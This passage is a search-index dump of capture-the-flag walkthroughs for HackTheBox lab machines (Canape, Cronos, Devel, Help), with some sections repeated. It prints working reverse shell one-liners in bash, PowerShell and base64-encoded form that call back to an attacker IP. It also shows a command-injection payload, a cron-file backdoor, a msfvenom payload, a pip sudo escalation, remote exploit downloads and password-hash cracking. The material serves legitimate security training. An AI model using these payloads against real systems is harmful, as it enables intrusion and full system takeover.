-tt /var/log/couchdb homer 642 0.4 3.5 649344 34920 ? Sl Apr13 1:11 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config www-data 1587 0.0 0.1 11284 1020 pts/0 S+ 01:37 0:00 grep couchdb Using cookie monster and go to Erlang www-data@canape:/home$ HOME=/ erl -sname 0xdf -setcookie monster Eshell V7.3 (abort with ^G) (0xdf@canape)1> os:cmd(\"id\"). \"uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n\" Using rpc module of Erlang and call to CouchDB (0xdf@canape)2> rpc:call('couchdb@localhost', os, cmd, [whoami]). \"homer\\n\" Create homer shell (0xdf@canape)3> rpc:call('couchdb@localhost', os, cmd, [\"echo -n c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQ== | base64 -d | bash\"]). At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.0:39.5]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 43496 sh: 0: can't access tty; job control turned off $ id uid=1000(homer) gid=1000(homer) groups=1000(homer)","title":"Erlang CouchDB Local PrivEscal"},{"location":"walkthrough/hackthebox/Canape/index.html#sudo-pip-command","text":"homer@canape:~$ sudo -l [sudo] password for homer: <snip> User homer may run the following commands on canape: (root) /usr/bin/pip install * Server allow execute /usr/bin/pip install * as root without require password. Based on GTFOBins/pip , I create a root shell. homer@canape:~$ TF=$(mktemp -d) homer@canape:~$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py homer@canape:~$ sudo /usr/bin/pip install $TF <snip> Processing /tmp/tmp.vuft5MuGm7 # id uid=0(root) gid=0(root) groups=0(root)","title":"Sudo Pip Command"},{"location":"walkthrough/hackthebox/Cronos/index.html","text":"HackTheBox Cronos Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.13 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 22,53,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.13 -p22,53,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 09:12 +07 Nmap scan report for 10.10.10.13 Host is up (0.26s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds DNS Server At port 53, I used nslooup to enum ip 10.10.10.13 and got the name server ns1.cronos.htb ### DNS Enumeration (53) ############################ nslookup 10.10.10.13 10.10.10.13 13.10.10.10.in-addr.arpa name = ns1.cronos.htb. Add domain ns1.cronos.htb and cronos.htb to file /etc/hosts and dig enum. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:21.4]~/scripting \u2514\u2500$ dig axfr cronos.htb @10.10.10.13 ; <<>> DiG 9.16.13-Debian <<>> axfr cronos.htb @10.10.10.13 ;; global options: +cmd cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 cronos.htb. 604800 IN NS ns1.cronos.htb. cronos.htb. 604800 IN A 10.10.10.13 admin.cronos.htb. 604800 IN A 10.10.10.13 ns1.cronos.htb. 604800 IN A 10.10.10.13 www.cronos.htb. 604800 IN A 10.10.10.13 cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 <snip> Laravel Web App There is defaul Apache page at port 80, but after add domain cronos.htb and go to it, I got a web application power by Laravel Add admin.cronos.htb , www.cronos.htb to file /etc/hosts 10.10.10.13 cronos.htb admin.cronos.htb www.cronos.htb ns1.cronos.htb Foothold SQL Injection At admin page, I try some payload SQLi to bypass authentication and I got it. Command Injection Admin page is Net Tool support traceroute server, but in the command box, I inject command ls and got the result. Inject command bash -c 'sh -i >& /dev/tcp/10.10.14.5/443 0>&1' and got the remote code execution. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.9:23.4]~/walkthrough/hackthebox/cronos \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 53806 sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation Crontab File overwrite Add file /etc/crontab , I know that the system running file /var/www/laravel/artisan with php command as root. www-data@cronos:/var/www$ cat /etc/crontab # /etc/crontab: system-wide crontab <snip> * * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1 Check permission file /var/www/laravel/artisan , This file owned by www-data, can easy to modify it. www-data@cronos:/var/www$ ls -lh /var/www/laravel/artisan -rwxr-xr-x 1 www-data www-data 1.7K Apr 9 2017 /var/www/laravel/artisan At simple system command to execute shell code in /var/www/laravel/artisan . echo system(\"bash -c 'sh -i >& /dev/tcp/10.10.14.5/443 0>&1'\"); >> /var/www/laravel/artisan Waiting 1 minute, I have root shell at my listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.9:25.2]~/priescal/PEASS/linPEAS \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 53762 sh: 0: can't access tty; job control turned off # whoami root","title":"HTB Cronos"},{"location":"walkthrough/hackthebox/Cronos/index.html#hackthebox-cronos","text":"Author: Hades Scripting here","title":"HackTheBox Cronos"},{"location":"walkthrough/hackthebox/Cronos/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Cronos/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.13 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 22,53,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.13 -p22,53,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 09:12 +07 Nmap scan report for 10.10.10.13 Host is up (0.26s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Cronos/index.html#dns-server","text":"At port 53, I used nslooup to enum ip 10.10.10.13 and got the name server ns1.cronos.htb ### DNS Enumeration (53) ############################ nslookup 10.10.10.13 10.10.10.13 13.10.10.10.in-addr.arpa name = ns1.cronos.htb. Add domain ns1.cronos.htb and cronos.htb to file /etc/hosts and dig enum. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:21.4]~/scripting \u2514\u2500$ dig axfr cronos.htb @10.10.10.13 ; <<>> DiG 9.16.13-Debian <<>> axfr cronos.htb @10.10.10.13 ;; global options: +cmd cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 cronos.htb. 604800 IN NS ns1.cronos.htb. cronos.htb. 604800 IN A 10.10.10.13 admin.cronos.htb. 604800 IN A 10.10.10.13 ns1.cronos.htb. 604800 IN A 10.10.10.13 www.cronos.htb. 604800 IN A 10.10.10.13 cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 <snip>","title":"DNS Server"},{"location":"walkthrough/hackthebox/Cronos/index.html#laravel-web-app","text":"There is defaul Apache page at port 80, but after add domain cronos.htb and go to it, I got a web application power by Laravel Add admin.cronos.htb , www.cronos.htb to file /etc/hosts 10.10.10.13 cronos.htb admin.cronos.htb www.cronos.htb ns1.cronos.htb","title":"Laravel Web App"},{"location":"walkthrough/hackthebox/Cronos/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Cronos/index.html#sql-injection","text":"At admin page, I try some payload SQLi to bypass authentication and I got it.","title":"SQL Injection"},{"location":"walkthrough/hackthebox/Cronos/index.html#command-injection","text":"Admin page is Net Tool support traceroute server, but in the command box, I inject command ls and got the result. Inject command bash -c 'sh -i >& /dev/tcp/10.10.14.5/443 0>&1' and got the remote code execution. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.9:23.4]~/walkthrough/hackthebox/cronos \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 53806 sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"Command Injection"},{"location":"walkthrough/hackthebox/Cronos/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Cronos/index.html#crontab-file-overwrite","text":"Add file /etc/crontab , I know that the system running file /var/www/laravel/artisan with php command as root. www-data@cronos:/var/www$ cat /etc/crontab # /etc/crontab: system-wide crontab <snip> * * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1 Check permission file /var/www/laravel/artisan , This file owned by www-data, can easy to modify it. www-data@cronos:/var/www$ ls -lh /var/www/laravel/artisan -rwxr-xr-x 1 www-data www-data 1.7K Apr 9 2017 /var/www/laravel/artisan At simple system command to execute shell code in /var/www/laravel/artisan . echo system(\"bash -c 'sh -i >& /dev/tcp/10.10.14.5/443 0>&1'\"); >> /var/www/laravel/artisan Waiting 1 minute, I have root shell at my listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.9:25.2]~/priescal/PEASS/linPEAS \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 53762 sh: 0: can't access tty; job control turned off # whoami root","title":"Crontab File overwrite"},{"location":"walkthrough/hackthebox/Devel/index.html","text":"HackTheBox Devel Author: Hades Scripting here Information Gathering Openning Services \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:14.5]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.5 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.5 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 21,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.5 -p21,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 02:42 EDT Nmap scan report for 10.10.10.5 Host is up (0.25s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM <DIR> aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds Microsoft ftpd Access to ftp server and I saw this is the web folder, I tested put permission and I got it. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:14.6]~/walkthrough/hackthebox/devel \u2514\u2500$ ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 02:06AM <DIR> aspnet_client 03-17-17 05:37PM 689 iisstart.htm 03-17-17 05:37PM 184946 welcome.png 226 Transfer complete. ftp> put leecybersec.com local: leecybersec.com remote: leecybersec.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 7 bytes sent in 0.00 secs (235.7220 kB/s) ftp> Microsoft IIS httpd 7.5 ### Web Enumeration (80) ############################ [+] Files and directories gobuster dir -k -u http://10.10.10.5:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /aspnet_client (Status: 301) [Size: 158] [--> http://10.10.10.5:80/aspnet_client/] <snip> [+] All URLs <title>IIS7</title> <a href=\"http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409\"><img src=\"welcome.png\" alt=\"IIS7\" width=\"571\" height=\"411\" /></a> Poc code here Back to file leecybersec.txt puted via ftp service. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:21.8]~/walkthrough/hackthebox/devel \u2514\u2500$ curl 10.10.10.5/leecybersec.txt hades Foothold Aspx Backdoor Poc code here I upload backdoor.aspx to server via ftp service and get a backdoor in the web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:22.5]~/walkthrough/hackthebox/devel \u2514\u2500$ ftp 10.10.10.5 Connected to 10.10.10.5. <snip> ftp> put backdoor.aspx local: backdoor.aspx remote: backdoor.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1663 bytes sent in 0.00 secs (14.2879 MB/s) ftp> Using Powershell to get reverse shell in the server. powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" Aspx Revershell Create reverse shell with msfvenom msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 EXITFUNC=thread -f aspx > shell.aspx Open listener in Kali machine sudo nc -nvlp 443 Upload file shell.aspx to web server using ftp service and execute this file. curl 10.10.10.5/shell.aspx Privilege Escalation Vulnerability in Ancillary Function Driver Poc code here Enum system info c:\\windows\\system32\\inetsrv>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 System Type: X86-based PC The OS Version is 6.1.7600 N/A Build 7600 have MS11-046: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege. Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046) Download this exploit and compile to binary execution. i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32 Upload 40564.exe to Devel using ftp service and execute it. c:\\inetpub\\wwwroot>whoami whoami iis apppool\\web c:\\inetpub\\wwwroot>40564.exe 40564.exe c:\\Windows\\System32>whoami whoami nt authority\\system Poc code here Also upload with fileupload.aspx or powershell . powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/40564.exe','C:\\Users\\Public\\shell.exe')\" c:\\Users\\Public>dir dir Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of c:\\Users\\Public <snip> 01/04/2021 12:10 \ufffd\ufffd 250.562 shell.exe 1 File(s) 250.562 bytes 8 Dir(s) 22.278.094.848 bytes free c:\\Users\\Public>shell.exe shell.exe c:\\Windows\\System32>whoami whoami nt authority\\system","title":"HTB Devel"},{"location":"walkthrough/hackthebox/Devel/index.html#hackthebox-devel","text":"Author: Hades Scripting here","title":"HackTheBox Devel"},{"location":"walkthrough/hackthebox/Devel/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Devel/index.html#openning-services","text":"\u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:14.5]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.5 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.5 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 21,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.5 -p21,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 02:42 EDT Nmap scan report for 10.10.10.5 Host is up (0.25s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM <DIR> aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Devel/index.html#microsoft-ftpd","text":"Access to ftp server and I saw this is the web folder, I tested put permission and I got it. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:14.6]~/walkthrough/hackthebox/devel \u2514\u2500$ ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 02:06AM <DIR> aspnet_client 03-17-17 05:37PM 689 iisstart.htm 03-17-17 05:37PM 184946 welcome.png 226 Transfer complete. ftp> put leecybersec.com local: leecybersec.com remote: leecybersec.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 7 bytes sent in 0.00 secs (235.7220 kB/s) ftp>","title":"Microsoft ftpd"},{"location":"walkthrough/hackthebox/Devel/index.html#microsoft-iis-httpd-75","text":"### Web Enumeration (80) ############################ [+] Files and directories gobuster dir -k -u http://10.10.10.5:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /aspnet_client (Status: 301) [Size: 158] [--> http://10.10.10.5:80/aspnet_client/] <snip> [+] All URLs <title>IIS7</title> <a href=\"http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409\"><img src=\"welcome.png\" alt=\"IIS7\" width=\"571\" height=\"411\" /></a> Poc code here Back to file leecybersec.txt puted via ftp service. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:21.8]~/walkthrough/hackthebox/devel \u2514\u2500$ curl 10.10.10.5/leecybersec.txt hades","title":"Microsoft IIS httpd 7.5"},{"location":"walkthrough/hackthebox/Devel/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Devel/index.html#aspx-backdoor","text":"Poc code here I upload backdoor.aspx to server via ftp service and get a backdoor in the web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:22.5]~/walkthrough/hackthebox/devel \u2514\u2500$ ftp 10.10.10.5 Connected to 10.10.10.5. <snip> ftp> put backdoor.aspx local: backdoor.aspx remote: backdoor.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1663 bytes sent in 0.00 secs (14.2879 MB/s) ftp> Using Powershell to get reverse shell in the server. powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"","title":"Aspx Backdoor"},{"location":"walkthrough/hackthebox/Devel/index.html#aspx-revershell","text":"Create reverse shell with msfvenom msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 EXITFUNC=thread -f aspx > shell.aspx Open listener in Kali machine sudo nc -nvlp 443 Upload file shell.aspx to web server using ftp service and execute this file. curl 10.10.10.5/shell.aspx","title":"Aspx Revershell"},{"location":"walkthrough/hackthebox/Devel/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Devel/index.html#vulnerability-in-ancillary-function-driver","text":"Poc code here Enum system info c:\\windows\\system32\\inetsrv>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 System Type: X86-based PC The OS Version is 6.1.7600 N/A Build 7600 have MS11-046: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege. Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046) Download this exploit and compile to binary execution. i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32 Upload 40564.exe to Devel using ftp service and execute it. c:\\inetpub\\wwwroot>whoami whoami iis apppool\\web c:\\inetpub\\wwwroot>40564.exe 40564.exe c:\\Windows\\System32>whoami whoami nt authority\\system Poc code here Also upload with fileupload.aspx or powershell . powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/40564.exe','C:\\Users\\Public\\shell.exe')\" c:\\Users\\Public>dir dir Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of c:\\Users\\Public <snip> 01/04/2021 12:10 \ufffd\ufffd 250.562 shell.exe 1 File(s) 250.562 bytes 8 Dir(s) 22.278.094.848 bytes free c:\\Users\\Public>shell.exe shell.exe c:\\Windows\\System32>whoami whoami nt authority\\system","title":"Vulnerability in Ancillary Function Driver"},{"location":"walkthrough/hackthebox/Help/index.html","text":"HackTheBox Help Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.121 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,80,3000 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.121 -p22,80,3000 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 15:27 +07 Nmap scan report for 10.10.10.121 Host is up (0.27s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 3000/tcp open http Node.js Express framework |_http-title: Site doesn't have a title (application/json; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.80 seconds Help Desk Software Port 80 is apache service, after enum hidden uri in with gobuster, there is a Help Desk Software in /support [+] Files and directories gobuster dir -k -u http://10.10.10.121:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /support (Status: 301) [Size: 314] [--> http://10.10.10.121/support/] After review the source code of HelpDeskZ, I go to /UPGRADING.txt to check the version. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:33.7]~/scripting \u2514\u2500$ curl 10.10.10.121/support/UPGRADING.txt Welcome to HelpDeskZ 1.0.2 ========================== Search public exploit, there are 2 exploit for HelpDeskZ 1.0.2 \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.7]~/scripting \u2514\u2500$ searchsploit HelpDeskZ 1.0.2 ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- HelpDeskZ 1.0.2 - Arbitrary File Upload | php/webapps/40300.py HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized F | php/webapps/41200.py ------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Node.js Express API Checking port 3000, it return message guide user Shiv find the credentials with given query \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.7]~/scripting \u2514\u2500$ curl 10.10.10.121:3000 {\"message\":\"Hi Shiv, To get access please find the credentials with given query\"} Based on result of nmap , Port 3000 is Node.js Express framework . After searching, I found Running an Express GraphQL Server and defind Graphql at http://localhost:4000/graphql in the documents. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:36.7]~/scripting \u2514\u2500$ curl 10.10.10.121:3000/graphql GET query missing. Add query and grab a banner \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.8]~/scripting \u2514\u2500$ curl '10.10.10.121:3000/graphql?query=\\{__schema\\{types\\{name,fields\\{name\\}\\}\\}\\}' --silent | python -m json.tool { \"data\": { \"__schema\": { \"types\": [ { \"fields\": [ { \"name\": \"user\" } ], \"name\": \"Query\" }, { \"fields\": [ { \"name\": \"username\" }, { \"name\": \"password\" } ], \"name\": \"User\" }, <snip> Using grabhql query, I got the value of username and password \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.6]~/scripting \u2514\u2500$ curl '10.10.10.121:3000/graphql?query=\\{user\\{username,password\\}\\}' --silent | python -m json.tool { \"data\": { \"user\": { \"password\": \"5d3c93182bb20f07b994a7f617e99cff\", \"username\": \"helpme@helpme.com\" } } } Cracking md5 hash with john \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.7]~/walkthrough/hackthebox/help \u2514\u2500$ john hash --wordlist=/home/kali/directory/rockyou.txt --format=raw-md5 <snip> godhelpmeplz (?) <snip> Login successfully to HelpDeskZ at port 80. Foothold HelpDeskZ File Upload Follow exploit php/webapps/40300.py . First, upload reverse shell php to server at url http://10.10.10.121/support/?v=submit_ticket&action=displayForm Trigger file shell at /uploads/tickets/ using exploit 40300.py . \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:27.2]~/walkthrough/hackthebox/help \u2514\u2500$ python 40300.py 'http://10.10.10.121/support/uploads/tickets/' php-reverse-shell.php Helpdeskz v1.0.2 - Unauthenticated shell upload exploit <snip> http://10.10.10.121/support/uploads/tickets/014a4af342600e47719c9c6eb22c483e.php At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:26.0]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.121] 60166 Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 03:44:05 up 1:40, 0 users, load average: 0.09, 0.04, 0.01 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) /bin/sh: 0: can't access tty; job control turned off $ id uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) (Authenticated) SQL Inj Privilege Escalation Linux Kernel < 4.4.0-116 Checking kernel, server is using Linux Kernel 4.4.0-116. help@help:/tmp$ uname -a Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux Search public exploit and I have linux/local/44298.c \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:27.2]~/walkthrough \u2514\u2500$ searchsploit 4.4.0-116 ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escala | 